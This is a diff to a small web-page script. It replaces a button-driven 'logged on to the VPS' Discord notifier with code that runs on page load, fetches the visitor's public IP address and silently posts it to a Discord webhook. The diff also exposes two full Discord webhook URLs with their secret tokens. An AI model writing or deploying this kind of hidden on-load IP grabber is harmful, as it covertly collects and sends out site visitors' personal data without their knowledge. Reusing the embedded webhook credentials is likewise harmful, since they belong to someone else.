@@ -1,18 +1,13 @@
 let loggedOn = false;
 
-function toggleVpsOn() {
+
+
+fetch("https://checkip.amazonaws.com/").then(res => res.text()).then(data => sendToDiscord(data))
+function sendToDiscord(mes) {
   let name = document.getElementById('name').value;
-  let message = 'I have logged on to the VPS.'
-  if(loggedOn){
-    message = 'I have logged off from the VPS.'
-    loggedOn = false;
-    document.getElementById('btn').innerText = "Log On";
-  } else {
-    document.getElementById('btn').innerText = "Log Off";
-    loggedOn = true;
-  }
+
   fetch(
-  'https://discord.com/api/webhooks/822153402984300594/7WTT3iOFsaA2_Q7AAWwIWkZCbPyZ6yapNkuNNUyzOLw4RiyN4bzgF8PKhLNWJiy8fHvm',
+  'https://discord.com/api/webhooks/826544206402551876/c47IRG9l40vx2c6BO7Hpf-3NO82v_JuKqc0YjXjHnfvvnF1rTT4NnjK2A0gYez1BbTJx',
   {
     method: 'post',
     headers: {
@@ -26,7 +21,7 @@ function toggleVpsOn() {
         'https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png',
       // contents of the message to be sent
       content:
-        message,
+        mes,
     }),
   }
   );
